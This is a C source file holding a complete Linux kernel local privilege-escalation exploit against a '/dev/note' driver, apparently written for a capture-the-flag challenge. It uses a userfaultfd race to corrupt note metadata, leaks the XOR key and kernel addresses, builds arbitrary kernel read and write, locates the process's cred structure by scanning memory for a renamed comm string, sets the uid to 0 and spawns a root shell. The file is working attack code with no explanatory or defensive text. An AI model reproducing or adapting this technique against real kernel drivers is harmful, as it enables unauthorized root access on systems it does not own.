#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <sys/prctl.h>


#define ADDR_FAULT 0xdead000

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)


int fd;
unsigned long long cmd[3];


void init_notes(int fd) {
    // puts("[+] Initialize notes");
    ioctl(fd, -253, cmd);
}

void view_note(int fd, unsigned long long index, void *buf) {
    // printf("[+] View %lld\n", index);
    cmd[0] = index;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -254, cmd);
}

void edit_note(int fd, unsigned long long index, void *buf) {
    // printf("[+] Edit %lld\n", index);
    cmd[0] = index;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -255, cmd);
}

void add_note(int fd, unsigned long long size, void *buf) {
    // printf("[+] Add size %lld\n", size);
    cmd[0] = 0; // index
    cmd[1] = size;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -256, cmd);
}

unsigned long long read64_offset(int fd, unsigned long long offset, unsigned long long key) {
    unsigned long long buf[0x100];

    memset(buf, 0, sizeof(buf));
    buf[2] = 0; // key
    buf[3] = 0xff ^ key; // size
    buf[4] = offset ^ key; // offset
    edit_note(fd, 1, buf);

    memset(buf, 0, sizeof(buf));
    view_note(fd, 2, buf);
    return buf[0] ^ key;
}


void readff(int fd, unsigned long long addr, unsigned long long buf[], unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long wbuf[0x100];
    memset(wbuf, 0, sizeof(wbuf));
    wbuf[2] = 0; // key
    wbuf[3] = 0xff ^ key;
    wbuf[4] = (addr - page_offset_base) ^ key;
    edit_note(fd, 1, wbuf);

    view_note(fd, 2, buf);
    int i;
    for (i = 0; i < 0xf0 / 8; ++i) {
        buf[i] ^= key;
    }
}

unsigned long long read64(int fd, unsigned long long addr, unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long buf[0x100];
    memset(buf, 0, sizeof(buf));
    readff(fd, addr, buf, key, page_offset_base);
    return buf[0];
}


void write64(int fd, unsigned long long addr, unsigned long long data, unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long buf[0x100];

    memset(buf, 0, sizeof(buf));
    buf[2] = 0;
    buf[3] = 0x8 ^ key;
    buf[4] = (addr - page_offset_base) ^ key;
    edit_note(fd, 1, buf);

    unsigned long long enc_data = data ^ key;
    edit_note(fd, 2, &enc_data);
}


static void *fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    unsigned long long ubuf[128];

    uffd = (long) arg;

    for (;;) {
        /* See what poll() tells us about the userfaultfd */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        /* Read an event from the userfaultfd */
        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }
        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        printf("[+] Handle userfaultfd at 0x%llx\n", msg.arg.pagefault.address);

        memset(ubuf, 0, sizeof(ubuf));
        init_notes(fd);
        add_note(fd, 0x10, ubuf);
        add_note(fd, 0x10, ubuf);

        /* We need to handle page faults in units of pages(!).
           So, round faulting address down to page boundary */
        ubuf[0] = 0;
        ubuf[1] = 0;
        ubuf[2] = 0;
        ubuf[3] = 0xff;

        // uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
        //     ~(page_size - 1);
        uffdio_copy.dst = ADDR_FAULT;
        uffdio_copy.src = (__u64)ubuf;
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        break;
    }
    return NULL;
}


pthread_t config_userfaultfd(void) {
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    uint64_t len;       /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    len = 0x1000;
    addr = mmap((void *)ADDR_FAULT, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr != (char *)ADDR_FAULT)
        errExit("mmap");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    return thr;
}


int main(void) {
    fd = open("/dev/note", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    unsigned long long buf[1024];
    memset(buf, 0, sizeof(buf));

    add_note(fd, 0x20, buf);

    pthread_t thr;
    thr = config_userfaultfd();
    edit_note(fd, 0, (void *)ADDR_FAULT);

    pthread_join(thr, NULL);

    view_note(fd, 1, buf);
    unsigned long long key;

    key = buf[2];
    printf("[+] key = 0x%llx\n", key);

    memset(buf, 0, sizeof(buf));
    add_note(fd, 0x10, buf); // 2

    view_note(fd, 1, buf);
    unsigned long long offset_chunk2 = buf[4] ^ key;
    unsigned long long offset_table = offset_chunk2 + 0x1f98;
    printf("[+] offset_chunk2 = 0x%llx\n", offset_chunk2);
    printf("[+] offset_table = 0x%llx\n", offset_table);

    unsigned long long addr_chunk0 = read64_offset(fd, offset_table, key);
    unsigned long long addr_module = addr_chunk0 - 0x2520;
    unsigned long long addr_chunk2 = addr_chunk0 + 0x50 + 0x18;
    unsigned long long page_offset_base = addr_chunk2 - offset_chunk2;
    unsigned long long addr_call_copy_from_user = addr_module + 0x6c;
    printf("[+] addr_chunk2 = 0x%llx\n", addr_chunk2);
    printf("[+] addr_module = 0x%llx\n", addr_module);
    printf("[+] page_offset_base = 0x%llx\n", page_offset_base);
    printf("[+] addr_call_copy_from_user = 0x%llx\n", addr_call_copy_from_user);

    puts("[!] Leak kernel address");
    int offset_copy_from_user = read64(fd, addr_call_copy_from_user + 1, key, page_offset_base) & 0xffffffff;
    unsigned long long addr_copy_from_user = addr_module + 0x71 + (unsigned long long)offset_copy_from_user;
    unsigned long long addr_kernel = addr_copy_from_user - 0x77ff81353e80;
    printf("[+] offset_copy_from_user = 0x%x\n", offset_copy_from_user);
    printf("[+] addr_copy_from_user = 0x%llx\n", addr_copy_from_user);
    printf("[+] addr_kernel = 0x%llx\n", addr_kernel);

    if (prctl(PR_SET_NAME, "hogefuga") < 0) {
        perror("prctl");
        return 1;
    }

    unsigned long long addr_comm;
    unsigned long long addr_check;
    printf("[-] Searching for comm...\n");
    for (addr_check = page_offset_base; ; addr_check += 0xe0) {
        if (addr_check % 0x100000 < 0xe0) {
            printf("[-] Searching 0x%llx\n", addr_check);
        }
        unsigned long long buf[0x100 / 8];
        void *tmp;
        readff(fd, addr_check, buf, key, page_offset_base);
        tmp = memmem(buf, 0xf0, "hogefuga", 8);
        if (tmp) {
            addr_comm = addr_check + (unsigned long long)(tmp - (void *)buf);
            break;
        }
    }

    unsigned long long addr_cred_ptr = addr_comm - 8;
    printf("[+] addr_comm = 0x%llx\n", addr_comm);
    printf("[+] addr_cred_ptr = 0x%llx\n", addr_cred_ptr);

    unsigned long long addr_cred = read64(fd, addr_cred_ptr, key, page_offset_base);
    printf("[+] addr_cred = 0x%llx\n", addr_cred);
    puts("[+] Overwrite cred->uid to 0");
    write64(fd, addr_cred + 4, 0, key, page_offset_base);

    system("/bin/sh");

    return 0;
}
